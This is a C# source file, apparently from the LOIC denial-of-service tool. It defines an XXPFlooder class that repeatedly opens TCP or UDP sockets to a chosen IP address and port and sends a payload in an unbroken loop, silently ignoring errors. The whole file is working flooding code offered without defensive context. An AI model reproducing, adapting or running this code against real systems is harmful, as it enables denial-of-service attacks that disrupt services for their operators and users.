using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.ComponentModel;

namespace LOIC
{
    public class XXPFlooder
    {
        public bool isFlooding = false;
        public int iFloodCount = 0;
        public string IP;
        public int Port;
        public int Protocol;
        public int Delay;
        public bool Resp;
        public string Data;
        private Random rnd = new Random();
        
        public XXPFlooder(string sIP, int iPort, int iProtocol, int iDelay, bool bResp, string sData)
        {
            IP = sIP; Port = iPort; Protocol = iProtocol;
            Delay = iDelay; Resp = bResp; Data = sData;
        }

        public void Start()
        {
            isFlooding = true;
            BackgroundWorker bw = new BackgroundWorker();
            bw.DoWork += new DoWorkEventHandler(bw_DoWork);
            bw.RunWorkerAsync();
        }

        private void bw_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                byte[] buf = System.Text.Encoding.ASCII.GetBytes(Data);
                IPEndPoint RHost = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
                while (isFlooding)
                {
                    Socket sck = null;

                    if (Protocol == 1)
                    {
                        sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        sck.Connect(RHost);
                        sck.Blocking = Resp;
                        try
                        {
                            while (isFlooding)
                            {
                                iFloodCount++;
                                sck.Send(buf);
                                if (Delay>0) System.Threading.Thread.Sleep(Delay);
                            }
                        }
                        catch { }
                    }
                    if (Protocol == 2)
                    {
                        sck = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        sck.Blocking = Resp;
                        try
                        {
                            while (isFlooding)
                            {
                                iFloodCount++;
                                sck.SendTo(buf, SocketFlags.None, RHost);
                                if (Delay > 0) System.Threading.Thread.Sleep(Delay);
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
        }
    }
}
